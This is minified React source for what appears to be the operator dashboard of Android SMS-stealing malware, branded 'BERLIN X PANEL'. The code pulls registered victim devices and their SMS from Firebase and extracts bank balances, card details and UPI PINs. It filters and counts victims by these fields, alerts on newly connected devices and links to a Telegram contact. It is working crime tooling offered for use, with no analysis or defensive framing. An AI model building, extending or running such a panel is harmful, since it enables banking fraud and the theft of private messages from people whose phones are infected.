function p1({
            fbUrl: A,
            fbKey: tt,
            accounts: accs,
            isMerged: isM,
            onLogout: b
        }) {
            const accountsList = accs && accs.length > 0 ? accs : [{
                url: A,
                key: tt
            }];
            const [starredIds, setStarredIds] = jt.useState(() => getStarredDevices());
            const handleToggleStar = (devId) => {
                const next = toggleStarredDevice(devId);
                setStarredIds(next);
            };
            const [d, S] = jt.useState([]), [f, p] = jt.useState(!0), [h, o] = jt.useState(!1), [x, T] = jt.useState(null), [w, C] = jt.useState("all"), [v, E] = jt.useState("new"), [g, z] = jt.useState(""), [N, k] = jt.useState(""), [M, H] = jt.useState(""), [L, nt] = jt.useState(new Date), V = jt.useRef(0), ot = jt.useRef(null), $ = jt.useRef(null), ht = jt.useRef(new Set), xt = jt.useCallback(U => {
                k(U), setTimeout(() => k(""), 3500)
            }, []), D = jt.useCallback(async (U, J) => {
                const devObj = typeof U === "object" ? U : null;
                const devId = devObj ? devObj.id : U;
                const targetUrl = devObj ? devObj._accountUrl : A;
                const targetKey = devObj ? devObj._accountKey : tt;
                try {
                    const ut = await yn(targetUrl, targetKey, `messages/${devId}`, {
                            orderBy: '"$key"',
                            limitToLast: "150"
                        }),
                        _t = Gu(ut),
                        St = Xu(_t);
                    S(yt => yt.map(Yt => Yt.id === devId ? { ...Yt,
                        smsAnalysis: St
                    } : Yt)), T(yt => yt ?.id === devId ? { ...yt,
                        smsAnalysis: St
                    } : yt), ht.current.add(devId)
                } catch {
                    ht.current.add(devId)
                }
                return J
            }, [A, tt]), at = jt.useCallback(async (U = !1) => {
                try {
                    let allDevs = [];
                    let errs = [];
                    await Promise.all(accountsList.map(async (acc) => {
                        try {
                            const J = await yn(acc.url, acc.key, "clients");
                            const ut = n1(J);
                            ut.forEach(dev => {
                                dev._accountUrl = acc.url;
                                dev._accountKey = acc.key;
                                allDevs.push(dev);
                            });
                        } catch (e) {
                            errs.push(e);
                        }
                    }));
                    if (allDevs.length === 0 && errs.length > 0) {
                        throw errs[0];
                    }
                    S(St => {
                        const yt = new Map(St.map(Mt => [Mt.id, Mt]));
                        return allDevs.map(Mt => ({ ...Mt,
                            smsAnalysis: yt.get(Mt.id) ?.smsAnalysis
                        }))
                    }), H(""), p(!1);
                    const _t = allDevs.filter(St => !ht.current.has(St.id));
                    if (_t.length > 0) {
                        U || o(!0);
                        const St = [];
                        for (let yt = 0; yt < _t.length; yt += 5) St.push(_t.slice(yt, yt + 5));
                        for (const yt of St) {
                            await Promise.all(yt.map(devObj => D(devObj)))
                        }
                        U || o(!1)
                    }
                    V.current > 0 && allDevs.length > V.current && xt("🔔 New device connected!"), V.current = allDevs.length
                } catch (J) {
                    p(!1);
                    const ut = J instanceof Error ? J.message : String(J);
                    ut.includes("PERMISSION_DENIED") || ut.includes("401") || ut.includes("403") ? H("Firebase Permission Denied — Your API key is rejected. Go to Firebase Console → Project Settings → Service Accounts → Database Secrets and copy the secret key.") : ut.includes("NOT_FOUND") || ut.includes("404") ? H("Database path not found. Check your Firebase URL is correct.") : H(`Connection error: ${ut.slice(0,120)}`)
                }
            }, [accountsList, D, xt]), c = jt.useCallback(async () => {
                const U = d;
                if (U.length !== 0)
                    for (let J = 0; J < U.length; J += 5) {
                        const ut = U.slice(J, J + 5);
                        await Promise.all(ut.map(_t => D(_t)))
                    }
            }, [d, D]), I = jt.useCallback(() => at(!1), [at]);
            jt.useEffect(() => {
                at(!1), ot.current = setInterval(() => at(!0), 15e3), $.current = setInterval(c, 45e3);
                const U = setInterval(() => nt(new Date), 1e3);
                return () => {
                    ot.current && clearInterval(ot.current), $.current && clearInterval($.current), clearInterval(U)
                }
            }, []);
            const Z = async () => {
                    confirm("Logout from current account?") && b()
                },
                q = U => {
                    T(U)
                },
                mt = d.filter(U => {
                    const isSt = starredIds.includes(U.id);
                    if (w === "online" && !U.status || w === "offline" && U.status || w === "starred" && !isSt || w === "upi" && !U.upipin || w === "bank" && !U.smsAnalysis ?.bankBalances.length || w === "card" && !U.smsAnalysis ?.cards.length) return !1;
                    const J = g.toLowerCase();
                    return !(J && !U.name.toLowerCase().includes(J) && !U.phoneNumber.includes(J) && !U.id.includes(J))
                }).sort((U, J) => v === "name" ? U.name.localeCompare(J.name) : v === "battery" ? J.batteryPercent - U.batteryPercent : v === "old" ? U.id.localeCompare(J.id) : J.id.localeCompare(U.id)),
                it = d.filter(U => U.status).length,
                bt = d.length - it,
                stCount = d.filter(U => starredIds.includes(U.id)).length,
                y = d.filter(U => U.smsAnalysis ?.bankBalances.length).length,
                _ = d.filter(U => U.smsAnalysis ?.cards.length).length,
                X = L.toLocaleTimeString("en-US", {
                    hour: "2-digit",
                    minute: "2-digit",
                    hour12: !1
                });
            return r.jsxs("div", {
                className: "min-h-screen bg-[#080808] text-white flex flex-col relative overflow-hidden",
                children: [r.jsx(Background3D, {}), r.jsx("header", {
                    className: "sticky top-0 z-40 bg-[#0a0a0a]/80 backdrop-blur-xl border-b border-[#1a1a1a]/80",
                    children: r.jsxs("div", {
                        className: "max-w-screen-2xl mx-auto px-6 py-3 flex items-center gap-4",
                        children: [r.jsxs("div", {
                            className: "flex items-center gap-2.5 flex-shrink-0",
                            children: [r.jsx("div", {
                                className: "w-7 h-7 rounded-lg bg-gradient-to-br from-red-600 to-orange-500 flex items-center justify-center shadow-lg shadow-red-900/50",
                                children: r.jsx("span", {
                                    className: "text-base font-black text-white select-none font-sans leading-none",
                                    children: r.jsx("img", { src: "https://i.ibb.co/fzBPJPjW/7517503-E-BFF5-4186-B64-A-C9-E2-DA45-C6-DA.png", style: { width: "100%", height: "100%", objectFit: "cover", borderRadius: "inherit" } })
                                })
                            }), r.jsx("span", {
                                className: "text-[#6acfff] animate-fade-in",
                                children: "BERLIN"
                            }), r.jsx("span", {
                                className: "animate-fade-in",
                                style: {
                                    animationDelay: "50ms"
                                },
                                children: "𝑿 "
                            }), r.jsx("span", {
                                className: "animate-fade-in",
                                style: {
                                    animationDelay: "200ms"
                                },
                                children: ""
                            }), r.jsxs("span", {
                                className: "relative animate-fade-in",
                                style: {
                                    animationDelay: "250ms"
                                },
                                children: ["𝑷𝑨𝑵𝑬𝑳", r.jsx("span", {
                                    className: "absolute -top-1 -right-1 w-1.5 h-1.5 bg-[#6acfff] rounded-full animate-glint"
                                })]
                            }), r.jsx("style", {
                                jsx: !0,
                                children: "@keyframes fadeIn{0%{opacity:0;transform:translateY(10px)scale(0.98);filter:blur(2px)}100%{opacity:1;transform:translateY(0)scale(1);filter:blur(0)}}.animate-fade-in{animation:fadeIn 1s ease-out forwards}@keyframes glint{0%,100%{transform:scale(1);opacity:0}50%{transform:scale(1.5);opacity:1}}.animate-glint{animation:glint 1.5s infinite;box-shadow:0 0 6px #6acfff,0 0 10px #0088cc}"
                            })]
                        }), r.jsxs("div", {
                            className: "relative flex-1 max-w-sm",
                            children: [r.jsx(xp, {
                                className: "absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#444]"
                            }), r.jsx("input", {
                                type: "text",
                                value: g,
                                onChange: U => z(U.target.value),
                                placeholder: "Search devices...",
                                className: "w-full pl-9 pr-4 py-2 rounded-xl bg-[#111] border border-[#222] focus:border-[#333] outline-none text-sm text-white placeholder:text-[#444] transition-all"
                            })]
                        }), r.jsxs("div", {
                            className: "ml-auto flex items-center gap-3",
                            children: [r.jsxs("div", {
                                className: "flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-950/40 border border-emerald-900/40",
                                children: [r.jsx("span", {
                                    className: "w-2 h-2 rounded-full bg-emerald-500",
                                    style: {
                                        boxShadow: "0 0 6px #22c55e"
                                    }
                                }), r.jsx("span", {
                                    className: "text-xs font-semibold text-emerald-400",
                                    children: isM ? `Merged (${accs?.length || 0} Firebases)` : "Connected"
                                }), isM && r.jsx("button", {
                                    onClick: () => {
                                        const link = ihMerge(accountsList);
                                        navigator.clipboard.writeText(link);
                                        xt("🔗 Merged share link copied!");
                                    },
                                    className: "ml-1 text-emerald-300 hover:text-white transition-colors",
                                    title: "Copy Merged Share Link",
                                    children: r.jsx(Ap, {
                                        className: "w-3 h-3"
                                    })
                                })]
                            }), r.jsxs("a", {
                                href: "https://t.me/ANUJXHERE",
                                target: "_blank",
                                rel: "noopener noreferrer",
                                className: "inline-block",
                                children: [r.jsx("span", {
                                    className: "inline-block glow-wave",
                                    children: r.jsx("svg", {
                                        xmlns: "http://www.w3.org/2000/svg",
                                        viewBox: "0 0 240 240",
                                        fill: "#0088cc",
                                        className: "w-8 h-8",
                                        children: r.jsx("path", {
                                            d: "M120 0C53.7 0 0 53.7 0 120s53.7 120 120 120 120-53.7 120-120S186.3 0 120 0zm56.1 83.1l-21.3 100.5c-1.6 7.1-5.8 8.9-11.7 5.5l-32.4-24.1-15.7 15.1c-1.7 1.7-3.1 3.1-6.3 3.1l2.3-32.5 59.2-53.5c2.6-2.3-0.6-3.6-4.1-1.3l-72.9 46.1-31.4-9.8c-6.8-2.1-6.9-6.8 1.4-10.1l121.5-46.7c5.6-2.1 10.5 1.3 8.9 9.1z"
                                        })
                                    })
                                }), r.jsx("style", {
                                    jsx: !0,
                                    children: `
          /* Subtle outer blue glow */
          .glow-wave {
            display: inline-block;
            padding: 4px; /* space for glow */
            border-radius: 50%;
            box-shadow: 0 0 6px #00bfff, 0 0 10px #0088cc;
            animation: wave 3s infinite ease-in-out;
          }

          /* Gentle waving */
          @keyframes wave {
            0% { transform: rotate(0deg); }
            25% { transform: rotate(2deg); }
            50% { transform: rotate(0deg); }
            75% { transform: rotate(-2deg); }
            100% { transform: rotate(0deg); }
          }
        `
                                })]
                            }), r.jsxs("div", {
                                className: "flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-[#111] border border-[#1e1e1e]",
                                children: [r.jsx(I0, {
                                    className: "w-3.5 h-3.5 text-[#555]"
                                }), r.jsx("span", {
                                    className: "text-xs font-mono font-bold text-[#888]",
                                    children: X
                                })]
                            }), r.jsxs("button", {
                                onClick: Z,
                                className: "flex items-center gap-2 px-3 py-1.5 rounded-xl border border-[#222] bg-[#111] text-xs text-[#666] hover:text-red-400 hover:border-red-900/40 transition-all",
                                children: [r.jsx(fp, {
                                    className: "w-3.5 h-3.5"
                                }), "Logout"]
                            })]
                        })]
                    })
                }), M && r.jsx(h1, {
                    message: M,
                    onDismiss: () => H("")
                }), r.jsx("div", {
                    className: "border-b border-[#1a1a1a]/80 bg-[#0a0a0a]/70 backdrop-blur-md relative z-10",
                    children: r.jsxs("div", {
                        className: "max-w-screen-2xl mx-auto px-6 py-3 flex items-center gap-6 flex-wrap",
                        children: [r.jsxs("div", {
                            className: "flex items-center gap-5",
                            children: [r.jsxs("div", {
                                children: [r.jsx("p", {
                                    className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
                                    children: "Total"
                                }), r.jsx("p", {
                                    className: "text-lg font-black text-white",
                                    children: d.length
                                })]
                            }), r.jsxs("div", {
                                children: [r.jsx("p", {
                                    className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
                                    children: "Online"
                                }), r.jsx("p", {
                                    className: "text-lg font-black text-emerald-400",
                                    children: it
                                })]
                            }), r.jsxs("div", {
                                children: [r.jsx("p", {
                                    className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
                                    children: "Offline"
                                }), r.jsx("p", {
                                    className: "text-lg font-black text-[#555]",
                                    children: bt
                                })]
                            }), r.jsxs("div", {
                                children: [r.jsx("p", {
                                    className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
                                    children: "Starred ⭐"
                                }), r.jsx("p", {
                                    className: "text-lg font-black text-amber-400",
                                    children: stCount
                                })]
                            }), r.jsxs("div", {
                                children: [r.jsx("p", {
                                    className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
                                    children: "Bank SMS"
                                }), r.jsx("p", {
                                    className: "text-lg font-black text-emerald-400",
                                    children: y
                                })]
                            }), _ > 0 && r.jsxs("div", {
                                children: [r.jsx("p", {
                                    className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
                                    children: "Cards"
                                }), r.jsx("p", {
                                    className: "text-lg font-black text-purple-400",
                                    children: _
                                })]
                            })]
                        }), r.jsxs("div", {
                            className: "ml-auto flex items-center gap-2 flex-wrap",
                            children: [
                                ["all", "online", "offline", "starred", "upi", "bank", "card"].map(U => r.jsx("button", {
                                    onClick: () => C(U),
                                    className: `px-3 py-1.5 rounded-lg text-xs font-semibold capitalize transition-all ${w===U?U==="bank"?"bg-emerald-600/20 text-emerald-400 border border-emerald-600/30":U==="card"?"bg-purple-600/20 text-purple-400 border border-purple-600/30":U==="starred"?"bg-amber-600/20 text-amber-400 border border-amber-600/30":"bg-red-600/20 text-red-400 border border-red-600/30":"text-[#555] hover:text-[#888]"}`,
                                    children: U === "starred" ? "⭐ Starred" : U
                                }, U)), r.jsx("div", {
                                    className: "w-px h-4 bg-[#222]"
                                }), r.jsxs("select", {
                                    value: v,
                                    onChange: U => E(U.target.value),
                                    className: "bg-[#111] border border-[#222] text-xs text-[#666] rounded-lg px-2 py-1.5 outline-none",
                                    children: [r.jsx("option", {
                                        value: "new",
                                        children: "Newest"
                                    }), r.jsx("option", {
                                        value: "old",
                                        children: "Oldest"
                                    }), r.jsx("option", {
                                        value: "name",
                                        children: "Name"
                                    }), r.jsx("option", {
                                        value: "battery",
                                        children: "Battery"
                                    })]
                                }), r.jsx("button", {
                                    onClick: I,
                                    className: "p-2 rounded-lg bg-[#111] border border-[#222] text-[#555] hover:text-[#888] hover:border-[#333] transition-all",
                                    children: r.jsx(ys, {
                                        className: "w-3.5 h-3.5"
                                    })
                                })
                            ]
                        })]
                    })
                }), r.jsx("main", {
                    className: "flex-1 max-w-screen-2xl mx-auto w-full px-3 sm:px-6 py-4 sm:py-6 relative z-10",
                    children: f ? r.jsxs("div", {
                        children: [r.jsxs("div", {
                            className: "flex items-center gap-3 mb-5",
                            children: [r.jsx("div", {
                                className: "w-4 h-4 border-2 border-[#333] border-t-red-500 rounded-full animate-spin"
                            }), r.jsx("span", {
                                className: "text-sm text-[#555]",
                                children: "Connecting to Firebase…"
                            })]
                        }), r.jsx("div", {
                            className: "grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-2 xl:grid-cols-2 2xl:grid-cols-2 gap-3 sm:gap-4",
                            children: Array.from({
                                length: 6
                            }).map((U, J) => r.jsx(m1, {}, J))
                        })]
                    }) : d.length === 0 ? r.jsxs("div", {
                        className: "flex flex-col items-center justify-center py-24 text-center",
                        children: [r.jsx("div", {
                            className: "w-16 h-16 rounded-2xl bg-[#111] border border-[#1e1e1e] flex items-center justify-center mb-5",
                            children: r.jsx(gs, {
                                className: "w-12 h-12 text-[#2a2a2a]"
                            })
                        }), r.jsx("p", {
                            className: "text-base font-bold text-[#444]",
                            children: "No devices connected"
                        }), r.jsx("p", {
                            className: "text-sm text-[#333] mt-1.5 mb-5",
                            children: "Waiting for devices to register…"
                        }), r.jsxs("div", {
                            className: "flex items-center gap-2 px-4 py-2 rounded-full bg-[#111] border border-[#1e1e1e]",
                            children: [r.jsx("div", {
                                className: "w-2 h-2 rounded-full bg-red-500 animate-pulse"
                            }), r.jsx("span", {
                                className: "text-xs text-[#555]",
                                children: "Auto-refreshing every 15s"
                            })]
                        })]
                    }) : r.jsxs("div", {
                        children: [h && r.jsxs("div", {
                            className: "flex items-center gap-2 mb-4 px-3 py-2 rounded-xl bg-[#111] border border-[#1e1e1e] w-fit",
                            children: [r.jsx("div", {
                                className: "w-3 h-3 border-2 border-[#333] border-t-emerald-500 rounded-full animate-spin"
                            }), r.jsx("span", {
                                className: "text-xs text-[#555]",
                                children: "Loading SMS data…"
                            })]
                        }), r.jsxs("div", {
                            className: "grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-2 xl:grid-cols-2 2xl:grid-cols-2 gap-3 sm:gap-4",
                            children: [mt.map(U => r.jsx(f1, {
                                dev: U,
                                isStarred: starredIds.includes(U.id),
                                onToggleStar: handleToggleStar,
                                onClick: () => q(U)
                            }, U.id)), mt.length === 0 && r.jsx("div", {
                                className: "col-span-full py-16 text-center",
                                children: r.jsx("p", {
                                    className: "text-sm text-[#444]",
                                    children: "No devices match your filter"
                                })
                            })]
                        })]
                    })
                }), N && r.jsx("div", {
                    className: "fixed bottom-6 left-1/2 -translate-x-1/2 z-50 px-5 py-3 rounded-2xl bg-[#1a1a1a] border border-[#2a2a2a] text-sm font-semibold text-white shadow-xl",
                    children: N
                }), x && r.jsx(d1, {
                    dev: x,
                    fbUrl: A,
                    fbKey: tt,
                    onClose: () => T(null),
                    onDelete: () => {
                        T(null), I()
                    },
                    showToast: xt
                })]
            })
        }

        